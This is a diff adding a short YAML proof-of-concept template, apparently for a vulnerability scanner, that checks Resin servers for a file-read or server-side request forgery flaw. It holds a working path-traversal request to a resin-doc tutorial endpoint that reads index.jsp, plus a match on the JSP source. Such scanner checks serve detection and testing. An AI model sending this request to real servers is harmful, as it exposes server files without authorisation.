@@ -1,0 +1,22 @@
+id: poc-yaml-resin-inputfile-fileread-or-ssrf
+info:
+  name: Resin Inputfile Fileread Or 服务端请求伪造漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: Resin
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<%@ page session=\"false\" import=\"com.caucho.vfs.*,
+    com.caucho.server.webapp.*\" %>")
+  output: []
